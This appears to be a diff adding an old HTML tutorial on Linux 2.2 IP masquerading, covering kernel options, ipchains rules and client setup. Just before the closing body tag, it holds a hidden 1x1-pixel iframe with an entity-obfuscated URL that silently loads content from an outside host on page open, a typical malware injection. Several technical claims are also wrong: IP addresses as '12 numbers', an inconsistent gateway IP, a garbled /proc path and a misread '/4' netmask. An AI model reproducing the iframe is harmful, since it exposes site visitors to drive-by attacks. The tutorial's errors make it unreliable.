@@ -1,0 +1,262 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   
+   <title> IP-MASQUERADING </title>
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</STYLE></head>
+<body bgcolor="#BEBCD3">
+
+<center><h1>
+IP-Masquerading</h1></center>
+
+<h2>
+1 Masquerading ?</h2>
+
+<h3>
+1.1 About this document</h3>
+This document has one reason for existing, to teach something to others.
+<h3>
+Who should be reading this document</h3>
+If you have some computers standing at home and you want to share your
+internet connection with the rest of the family, or if you like seeing
+your mail on the screen on the left side of your desk and your irc window
+on the screen that is standing at the right side of your desk you need
+ip masquerading. Yes I know there are also modem sharing packets for Microsoft
+products on the market. But the advantage is that this can be run on a
+386 computer and it takes 3 more commands and you can have your own firewall.
+There are also more providers who offer cable modems and (too) much bandwidth
+for one computer. I think it is very handy. If I am reading my e-mail and
+I want to see if one of my friends is on IRC I just have to turn my head.
+You don't really need a cable modem, it also goes if you have a modem connection
+(I am the living example of that).
+<h3>
+1.2 What do you need ?</h3>
+Although I haven't explained what masquerading actually is (be patient)
+I will start by telling you what you need in order to use masquerading.
+You need:
+<ul>
+<li>
+Multiple (>2) computers</li>
+
+<li>
+A network connecting these computers</li>
+
+<li>
+Different ip-numbers assigned to all computers</li>
+
+<li>
+One pc who has a modem and an internet connection</li>
+
+<li>
+The Linux os with a 2.2.x or higher kernel running on that machine</li>
+
+<li>
+Half an hour of time (in the worst case)</li>
+
+<li>
+Something to eat</li>
+</ul>
+So now you know what you need in order to use masquerading, I can start
+explaining what masquerading actually is:
+<h3>
+What is it</h3>
+I know that masquerading is a complicated process so before getting all
+technical I'll start with an example that makes it easier to understand.
+Person A loves person B but person A isn't at the same school nor has her
+telephone number. There is also a common friend (person C) someone who
+knows A and is at the some school of B. So A is going to ask C to talk
+to B without mentioning who person A is. Pretending the acquired information
+is for himself.
+<p>You will probably wondering why I made that example or on what television
+show you have seen the same. Well it is quite simple. Person B is the internet,
+and person A is a masqueraded client and person C is the masqueraded server.
+<p>For understanding it I'll first give a short introduction to TCP/IP".
+TCP/IP stands for Transmission Control Protocol / Internet Protocol. It
+is widely used for data communication among computers (before TCP/IP, everybody
+used UUCP = Unix to Unix Copy Protocol). TCP/IP is literally a protocol
+that controls your communication, it also uses IP numbers. IP-numbers consist
+out of 12 numbers grouped by 3 (123.456.789.123). Every computer attached
+to a network (and to the internet) have their own unique IP number. TCP/IP
+works like the following.
+<br>=> I am 1.2.3.4 and i want to contact 1.2.3.3
+<br>-> I am 1.2.3.3 did you call me ?
+<br>=> I am 1.2.3.4 and I contacted you
+<br>-> I am 1.2.3.3 and ready
+<br>=> I am 1.2.3.4 and I want that file
+<br>-> I am 1.2.3.3 and I am sending the first part to 1.2.3.4
+<br>=> I am 1.2.3.4 and I have received it.
+<br>-> I am 1.2.3.3 and I am sending the second part to 1.2.3.4
+<br>=> I am 1.2.3.4 and I haven't received anything
+<br>-> I am 1.2.3.3 and I am sending again
+<br>=> I am 1.2.3.4 and I have received it.
+<br>-> I am 1.2.3.3 and I am waiting.
+<br>=> I am 1.2.3.4 and I am ready, bye
+<br>-> I am 1.2.3.3 Bye
+<br>I know this may seem a little childish but data communication (and
+TCP/IP) are working like that.
+<center>
+<p><img SRC="networking.gif" height=200 width=400></center>
+
+<p>Now you should be able to understand the image. You see a computer with
+local IP 10.0.0.1 who is connected to the internet by a telephone line
+and has achieved an IP number by this ISP (Internet Service Provider) that
+IP is 11.1.1.4. What does this mean ? If someone on the internet tried
+to contact 11.1.1.4 they would get a response but if they would try to
+contact 10.0.0.1 they would not get a response although it is the same
+computer because the IP 10.0.0.1 isn't recognized worldwide. Then we have
+10.0.0.2 till 10.0.0.x who are connected to 10.0.0.1. In this case we could
+consider 10.0.0.1 as a gateway (a gateway is a sort of exit to another
+network, a gateway could be a link between 10.0.1.x and 10.0.0.x, but therefore
+that machine must be recognized by 10.0.1.x and 10.0.0.x or with other
+words it should have 2 network cards or in this case a modem and a network
+card). So we could consider it as a gateway but there is one detail, for
+10.0.0.1 being a gateway. But it isn't for the simple reason that the internet
+wouldn't recognize it.
+<br>=> I'm 10.0.0.2 and I want to contact you
+<br>-> I'm 1.2.3.3 and I have now idea how to reach you, go away (this
+messages isn't really broadcasted because there is no logical route between
+the two computers, this is logged)
+<br>So what does masquerading actually do ? Well, it gives its own IP (11.1.1.4
+this is the IP that is attached to the ISP, giving by DHCP by exemple)
+to the entire network and remembers which computer requested which packet.
+Something like:
+<br>=> I'm 10.0.0.2 and I want to contact 1.2.3.3
+<br>-> I'm 10.0.0.1 and I will be processing your request
+<br>-> I'm 14.1.1.4 and I want to contact 1.2.3.3
+<br>_> I'm 1.2.3.3 and awaiting your command
+<br>I hope this cleared out a lot. So a masqueraded server gives its IP
+( in facts it masks the ip's of the network) in order for the other pc's
+to get on the internet. And the incoming data is being filtered under the
+10.0.0.x network.
+<h2>
+2 I hate theory I want to type something</h2>
+
+<h3>
+2.1 Preparing your system</h3>
+I am supposing that you all have a computer with Linux OS installed on
+it and that you have configured your internet account (if not, check the
+help pages by your provider). And know some Linux basics like compiling
+your own kernel. This entire site is only valid if you have a 2.2.x kernel.
+Because masquerading went thru some changes lately. If you have not got
+a 2.2.x kernel running, I suggest you upgrade. Because older kernels might
+contain bugs, might not support your newest hardware and make your system
+vulnerable to attacks. You can get the latest kernel from <a href="ftp://ftp.kernel.org">ftp.kernel.org</a>
+(I will explain short the kernel basics here)
+<br><i>[GoMoRRaH@SaTaN GoMoRRaH]$ mv mykernel.tar.gz /usr/src/</i>
+<br><i>[GoMoRRaH@SaTaN GoMoRRaH]$ cd /usr/src</i>
+<br><i>[GoMoRRaH@SaTaN src]$ rm linux (removes the symbolic link to your
+old sources)</i>
+<br><i>[GoMoRRaH@SaTaN src]$ tar -zxvf mykernel.tar.gz</i>
+<br><i>(your kernel is now being extracted default in the directory linux)</i>
+<br><i>[GoMoRRaH@SaTaN src]$ cd linux</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ make menuconfig</i>
+<br>(you can choose, type: make config for text based, type: make menuconfig
+for graphical and type: make xconfig under X-windows)
+<br>Now you can see all the options you can use, this is different for
+each system so, * stands for support and M stand for modules, modules are
+pieces of kernel code that can be compiled in at any time, later on) But
+however you have to say YES to the following:
+<p>=> Prompt for development and or incomplete code / drivers
+<br>=>Enable loadable module support
+<br>=>Networking support
+<br>=>Network firewalls
+<br>=>TCP/IP Networking
+<br>=>IP:forwarding/gatewaying
+<br>=>IP:firewalling
+<br>=>IP:masquerading
+<br>=>IP:ipportfw masq support
+<br>=>IP:ipautofw masq support
+<br>=>IP:ICMP masquerading
+<br>=>IP:always defragment
+<br>=>Dummy net driver support
+<br>=>IP:ip fwmark masq-forwarding support
+<p>Note that the above options are required for ip masquerading so you
+still need other codes in your kernel. When you are finished you will be
+prompted to save changes. The following commands do the actual compiling
+and may take a from 10 - 40 minutes and will show many characters which
+you may not understand on your screen, don't worry it is normal.
+<br><i>[GoMoRRaH@SaTaN linux]$ make dep</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ make clean</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ make bzImage</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ cp /usr/src/linux/arch/i386/boot/bzImage
+/boot/kernel</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ make modules</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ make modules_install</i>
+<br>At this point you should edit your <i>/etc/lilo.conf</i> file. You
+should add something like
+<br>image=/boot/kernel
+<br>label=masqkernel
+<br>root=/dev/hdax (replace this by your root filesystem, harddisk, partition,
+..)
+<br>read-only
+<br>This makes your boot manager find your new kernel at boot. So if your
+see the lilo prompt the next time you should type <i>masqkernel</i>
+<br><i>[GoMoRRaH@SaTaN linux]$ lilo</i>
+<br><i>added linux-2.2.5-15 *</i>
+<br><i>added dos</i>
+<br><i>added masqkernel</i>
+<br>Now you should edit your
+<i>/etc/rc.d/rc.local</i> file so the modules
+needed are automatically loaded at boot
+<br>.
+<br>.
+<br>/sbin/depmode -a
+<br>/sbin/modprobe ip_masq_ftp
+<br>/sbin/modprobe ip_masq_raudio
+<br>/sbin/modprobe ip_masq_irc
+<br>.
+<br>.
+<br>These modules are needed for ftp, real audio and irc. There is only
+one thing to do besides rebooting and that is enabling your IPV4 forwarding.
+<br><i>[GoMoRRaH@SaTaN linux] echo "1" > /proc/sys/net/ip_forward(ing)
+</i>Now you should reboot your system with your newly made kernel, see
+if everything boots properly, if not you should redo the above steps. Until
+you have a properly working kernel.
+<h3>
+Start up your masquerade</h3>
+In fact there isn't much to do once you've got your kernel right. It is
+a matter of dialing in with you provider, and typing 2 commands. They are
+used to set your forwarding policies. <i>[GoMoRRaH@SaTaN GoMoRRaH]$ ipchains
+-P forward DENY</i>
+<br><i>[GoMoRRaH@SaTaN GoMoRRaH]$ ipchains -A forward -s 10.0.0.0/4 -j
+MASQ</i>
+<br>In order for this to work on your local network the only thing you
+have to adjust is the -s parameter. 10.0.0.0 is your network address and
+the 4 is the highest ip number that is masqueraded. Your server should
+work now. And yeah, that's really it, you have a lot of theory and a lot
+of preparation with your kernel and you have to type 2 lines to get your
+server up and running.
+<h3>
+Configuring your clients</h3>
+You have a server but what is a server without clients ? What is a supermarket
+without customers ? Not that you have to do so much configuring no not
+at all. There is only one little thing that you have to take care of, (if
+it isn't already done). Your clients should have as a gateway the IP of
+your masqueraded server (here 10.0.0.1) This is located near your networking
+options it shouldn't be hard to find.
+<h2>
+3 General</h2>
+<b>Other information sources</b>
+<br>If you want to know more about Linux networking or Linux in general
+you should read documents that are published by the LDP (Linux documentation
+Project). They have published a Network administrators guide, a system
+administrators guide, a programmers guide and several HOWTO's. They come
+with each Linux distribution and are really worth reading.
+<p>For any further questions, you can mail <a href="mailto:metal@digibel.org">GoMoRRaH</a>,
+a member of <i><a href="http://blacksun.box.sk">Black Sun Research Facility</a></i>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
